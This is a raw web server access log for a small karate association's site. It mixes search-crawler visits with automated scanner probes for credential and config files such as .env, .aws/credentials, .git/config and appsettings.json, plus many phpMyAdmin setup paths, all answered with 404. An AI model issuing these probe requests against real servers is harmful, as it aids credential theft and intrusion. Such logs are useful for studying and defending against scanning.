::ffff:43.155.118.219 - - [22/Mar/2023:00:22:13 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:00:38:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:00:38:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:01:07:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:01:07:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.81.243.34 - - [22/Mar/2023:01:08:01 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:45.81.243.34 - - [22/Mar/2023:01:08:01 +0000] "POST /HNAP1/ HTTP/1.1" 404 146 "-" "Mozila/5.0"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:18 +0000] "GET /.aws/credentials HTTP/1.1" 404 155 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:18 +0000] "GET /config/.aws/credentials HTTP/1.1" 404 162 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:18 +0000] "GET /printenv.pl HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:19 +0000] "GET /config/printenv.pl HTTP/1.1" 404 157 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:19 +0000] "GET /cgi-bin/printenv.pl HTTP/1.1" 404 158 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:19 +0000] "GET /config/cgi-bin/printenv.pl HTTP/1.1" 404 165 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:20 +0000] "GET /appsettings.Production.json HTTP/1.1" 404 166 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:20 +0000] "GET /config/appsettings.Production.json HTTP/1.1" 404 173 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:20 +0000] "GET /appsettings.Development.json HTTP/1.1" 404 167 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:21 +0000] "GET /config/appsettings.Development.json HTTP/1.1" 404 174 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:21 +0000] "GET /appsettings.json HTTP/1.1" 404 155 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:21 +0000] "GET /config/appsettings.json HTTP/1.1" 404 162 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:21 +0000] "GET /sendgrid.env HTTP/1.1" 404 151 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:22 +0000] "GET /config/sendgrid.env HTTP/1.1" 404 158 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:22 +0000] "GET /config.js HTTP/1.1" 404 148 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:22 +0000] "GET /config/config.js HTTP/1.1" 404 155 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:23 +0000] "GET /config.json HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:23 +0000] "GET /config/config.json HTTP/1.1" 404 157 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:23 +0000] "GET /default.json HTTP/1.1" 404 151 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:24 +0000] "GET /config/default.json HTTP/1.1" 404 158 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:24 +0000] "GET /environment.rb HTTP/1.1" 404 153 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:24 +0000] "GET /config/environment.rb HTTP/1.1" 404 160 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:24 +0000] "GET /.s3cfg HTTP/1.1" 404 145 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:25 +0000] "GET /config/.s3cfg HTTP/1.1" 404 152 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:26 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:27 +0000] "GET /dev/.git/config HTTP/1.1" 404 154 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:27 +0000] "GET /prod/.git/config HTTP/1.1" 404 155 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:27 +0000] "GET /admin/.git/config HTTP/1.1" 404 156 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:28 +0000] "GET /app/.git/config HTTP/1.1" 404 154 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:28 +0000] "GET /application/.git/config HTTP/1.1" 404 162 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:28 +0000] "GET /vendor/.git/config HTTP/1.1" 404 157 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:28 +0000] "GET /config/.git/config HTTP/1.1" 404 157 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:29 +0000] "GET /views/.git/config HTTP/1.1" 404 156 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:29 +0000] "GET /resources/.git/config HTTP/1.1" 404 160 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:29 +0000] "GET /system/.git/config HTTP/1.1" 404 157 "-" "python-requests/2.28.2"
::ffff:195.133.40.25 - - [22/Mar/2023:01:23:30 +0000] "GET /src/.git/config HTTP/1.1" 404 154 "-" "python-requests/2.28.2"
::ffff:104.238.212.241 - - [22/Mar/2023:01:27:39 +0000] "GET /_profiler/phpinfo:80 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
::ffff:104.238.212.241 - - [22/Mar/2023:01:27:39 +0000] "GET /_profiler/phpinfo:443 HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
::ffff:104.238.212.241 - - [22/Mar/2023:01:27:39 +0000] "GET /_profiler/phpinfo:8080 HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
::ffff:104.238.212.241 - - [22/Mar/2023:01:27:39 +0000] "GET /_profiler/phpinfo:8081 HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
::ffff:104.238.212.241 - - [22/Mar/2023:01:27:39 +0000] "GET /_profiler/phpinfo:8082 HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
::ffff:114.119.131.245 - - [22/Mar/2023:01:34:06 +0000] "GET /schools HTTP/1.1" 200 97308 "https://wadokikai.org/joinemail?type=promotions" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:54.36.112.44 - - [22/Mar/2023:01:39:10 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:01:39:10 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [22/Mar/2023:01:42:06 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:40.77.167.249 - - [22/Mar/2023:01:49:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:114.119.150.57 - - [22/Mar/2023:01:49:49 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "https://wadokikai.org/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:67.188.252.130 - - [22/Mar/2023:01:50:40 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
::ffff:114.119.156.120 - - [22/Mar/2023:01:52:04 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "https://wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/php/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/pma/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/webadmin/scripts/setup.php HTTP/1.0" 404 165 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/mysqlmanager/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/webdb/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/admin/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/mysql-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/websql/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/admin/pma/scripts/setup.php HTTP/1.0" 404 166 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpma/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/admin/phpmyadmin/scripts/setup.txt HTTP/1.0" 404 173 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/_phpMyAdmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/SQL/scripts/setup.php HTTP/1.0" 404 160 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin2/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpmy-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/myadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/php-myadmin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/MyAdmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/db/scripts/setup.php HTTP/1.0" 404 159 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/sqlmanager/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/mysql/scripts/setup.php HTTP/1.0" 404 162 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/web/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 171 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/sqlweb/scripts/setup.php HTTP/1.0" 404 163 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/dbadmin/scripts/setup.php HTTP/1.0" 404 164 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.0" 404 177 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/mysqladmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 174 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.0" 404 173 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 175 "-" "-"
::ffff:8.130.68.95 - - [22/Mar/2023:02:34:19 +0000] "GET http://34.212.47.6:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 167 "-" "-"
::ffff:135.125.244.48 - - [22/Mar/2023:02:34:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:02:34:39 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:02:42:14 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [22/Mar/2023:02:42:14 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.148.233 - - [22/Mar/2023:02:43:34 +0000] "GET /images/arce.jpg HTTP/1.1" 404 154 "https://wadokikai.org/instructors.php" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:205.210.31.21 - - [22/Mar/2023:02:55:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:43.155.118.219 - - [22/Mar/2023:03:02:10 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:114.119.151.174 - - [22/Mar/2023:03:16:54 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "http://34.212.47.6/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:82.165.83.136 - - [22/Mar/2023:03:29:41 +0000] "GET /wordpress/ HTTP/1.1" 404 149 "-" "-"
::ffff:51.158.37.190 - - [22/Mar/2023:03:31:55 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:51.158.37.190 - - [22/Mar/2023:03:31:56 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:43.128.225.120 - - [22/Mar/2023:03:38:44 +0000] "GET / HTTP/1.1" 200 57378 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
::ffff:138.197.76.187 - - [22/Mar/2023:03:43:55 +0000] "GET / HTTP/1.0" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:138.197.76.187 - - [22/Mar/2023:04:02:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:138.197.76.187 - - [22/Mar/2023:04:02:34 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://34.212.47.6/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
::ffff:20.118.186.229 - - [22/Mar/2023:04:14:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:20.118.186.229 - - [22/Mar/2023:04:14:53 +0000] "GET /wp-content/ HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:43.155.118.219 - - [22/Mar/2023:04:22:25 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:162.214.71.92 - - [22/Mar/2023:04:38:52 +0000] "GET / HTTP/1.1" 200 57378 "-" "curl/7.29.0"
::ffff:162.142.125.223 - - [22/Mar/2023:04:42:18 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:162.142.125.223 - - [22/Mar/2023:04:42:18 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.223 - - [22/Mar/2023:04:42:18 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:162.142.125.223 - - [22/Mar/2023:04:42:18 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.223 - - [22/Mar/2023:04:42:18 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:54.36.112.44 - - [22/Mar/2023:04:54:26 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [22/Mar/2023:04:54:27 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.180.143.71 - - [22/Mar/2023:04:57:43 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:114.119.131.116 - - [22/Mar/2023:05:09:51 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "http://34.212.47.6/resources" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:40.77.167.190 - - [22/Mar/2023:05:16:34 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:05:19:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:05:19:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:195.191.219.130 - - [22/Mar/2023:05:22:46 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:195.191.219.130 - - [22/Mar/2023:05:22:48 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.125.244.48 - - [22/Mar/2023:05:31:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [22/Mar/2023:05:31:59 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [22/Mar/2023:05:43:26 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:40.77.167.190 - - [22/Mar/2023:05:48:57 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:40.77.167.196 - - [22/Mar/2023:05:49:14 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:52.167.144.44 - - [22/Mar/2023:05:49:19 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:51.222.253.18 - - [22/Mar/2023:05:51:58 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [22/Mar/2023:05:52:00 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [22/Mar/2023:05:52:02 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [22/Mar/2023:05:52:03 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [22/Mar/2023:05:52:04 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [22/Mar/2023:05:52:04 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
